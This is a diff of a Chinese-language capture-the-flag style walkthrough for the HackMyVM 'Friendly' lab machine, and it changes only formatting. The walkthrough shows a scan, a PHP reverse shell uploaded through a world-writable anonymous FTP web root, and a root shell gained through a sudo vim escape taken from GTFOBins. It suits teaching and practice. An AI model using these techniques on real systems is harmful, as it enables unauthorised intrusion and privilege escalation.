@@ -1,15 +1,13 @@
-# hmv_friendly
-
 # 0.简介
 
-**靶机**：https://hackmyvm.eu/machines/machine.php?vm=Friendly  
-**难度**：绿色  
-**目标 IP**：192.168.205.129  
-**本机 IP**：192.168.205.128
+靶机：https://hackmyvm.eu/machines/machine.php?vm=Friendly
+ 难度：绿色
+ 目标 IP：192.168.205.129
+ 本机 IP：192.168.205.128
 
 # 1.扫描
 
-​`nmap`​起手
+nmap起手
 
 ```
 ┌──(kali㉿kali)-[~/test]
@@ -23,7 +21,6 @@ PORT   STATE SERVICE
 80/tcp open  http
 
 Nmap done: 1 IP address (1 host up) scanned in 1.10 seconds
-
 ```
 
 # 2.踩点
@@ -47,7 +44,6 @@ ftp> ls -la
 drwxrwxrwx   2 root     root         4096 Mar 11  2023 .
 drwxrwxrwx   2 root     root         4096 Mar 11  2023 ..
 -rw-r--r--   1 root     root        10725 Feb 23  2023 index.html
-
 ```
 
 和我们发现的网页目录架构一样，我们可以尝试上传一个反弹shell上去访问
@@ -66,7 +62,6 @@ ftp> ls
 -rw-r--r--   1 root     root        10725 Feb 23  2023 index.html
 -rw-r--r--   1 ftp      nogroup      2596 Feb  3 04:32 php.php
 226 Transfer complete
-
 ```
 
 访问
@@ -82,12 +77,11 @@ USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
 bash: cannot set terminal process group (439): Inappropriate ioctl for device
 bash: no job control in this shell
-
 ```
 
 # 3. 获得稳定的 Shell
 
-获取**反向 shell** 后，通过以下命令获得稳定的**交互式** **TTY shell**：
+获取反向 shell 后，通过以下命令获得稳定的交互式 TTY shell：
 
 ```bash
 script /dev/null -c bash  
@@ -139,10 +133,9 @@ Matching Defaults entries for www-data on friendly:
 
 User www-data may run the following commands on friendly:
     (ALL : ALL) NOPASSWD: /usr/bin/vim
-
 ```
 
-![image](assets/image-20250203123641-1hov8b3.png)
+![image-20250331191435274](https://cdn.jsdelivr.net/gh/7r1UMPH/7r1UMPH.github.io@main/static/image/20250331191435317.png)
 
 🔗https://gtfobins.github.io/gtfobins/vim/#sudo
 
@@ -151,5 +144,6 @@ www-data@friendly:/$ sudo vim -c ':!/bin/sh'
 
 # id
 uid=0(root) gid=0(root) groups=0(root)
-
 ```
+
+<!-- ##{"timestamp":1738580133}## -->
